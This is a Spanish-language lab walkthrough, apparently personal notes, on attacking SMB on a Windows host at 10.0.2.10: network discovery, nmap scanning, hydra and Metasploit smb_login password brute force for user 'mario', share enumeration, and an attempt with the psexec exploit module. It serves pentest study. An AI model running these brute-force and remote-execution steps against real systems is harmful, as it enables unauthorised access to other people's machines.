
Es un protocolo típico en maquinas windows que vamos ha explotar de forma manual y con metasploit

**Manual**
```shell
arp-scan -I eth0 --localnet
nmap -p- --open -sS -sC -sV --min-rate=5000 -vvv -n -Pn 10.0.2.10 -oN escaneo
smbclient -L 10.0.2.10 -N
hydra -l mario -P /usr/share/wordlists/rockyou.txt smb://10.0.2.10
smbclient -L 10.0.2.10 -U 'mario'
smbmap -H 10.0.2.10 -u 'mario' -p '123123'

```
Primero de todo realizamos un arp-scan para encontrar la IP y una vez tengamos su IP realizamos un nmap y vemos que están abierto el puerto 445.![[Pasted image 20240306164628.png]]
Entonces ahora atacamos al puerto 445 con smbclient pero no nos deja ver los recursos sin introducir un usuario o contraseña![[Pasted image 20240306165236.png]]
Entonces hacemos un ataque de fuerza bruta con hydra  y encontramos la contraseña.
![[Pasted image 20240306165416.png]]
Ahora iniciaremos sesion con el usuario y contraseña y encontramos los siguientes recursos compartidos.![[Pasted image 20240306165639.png]]
Entonces ahora usaremos smbmap para ver los permisos de esos recursos compartidos.![[Pasted image 20240306165806.png]]
Ahora entraremos al directorio users mediante el smbclient.![[Pasted image 20240306165956.png]]

**Metasploit**
Vamos a tener en cuanta la ip de antes
```shell
msfdb init && msfconsole
```

```Metasploit
use auxiliary/scanner/smb/smb_login
show options
set RHOSTS 10.0.2.10
set SMBUser mario
set PASS_FILE /usr/share/wordlists/rockyou.txt
set VERBOSE false
```
Entramos en metasploit y usamos el smb_login para atacar a la máquina objetivo![[Pasted image 20240306184259.png]]
Ahora configuramos el rhosts, verbose, usuarios y diccionario de contraseñas![[Pasted image 20240306184448.png]]![[Pasted image 20240306184529.png]]
Y ahora ejecutamos el comando run y rapidamente nos encuentra la contraseña del usuario![[Pasted image 20240306184617.png]]
Ahora ejecutaremos el modulo psexec
```Metasploit
use exploit/windows/smb/psexec
show options
set RHOSTS 10.0.2.10
set SMBUser mario
set SMBPass 123123
```
Vemos que tenemos que configurar![[Pasted image 20240306184905.png]]
Y configuramos el RHOSTS, SMBUser, SMBPass![[Pasted image 20240306185028.png]]
Ahora ejecutamos el exploit pero en este caso no funciona, no obstante en otras máquinas si que puede utilizar![[Pasted image 20240306185122.png]]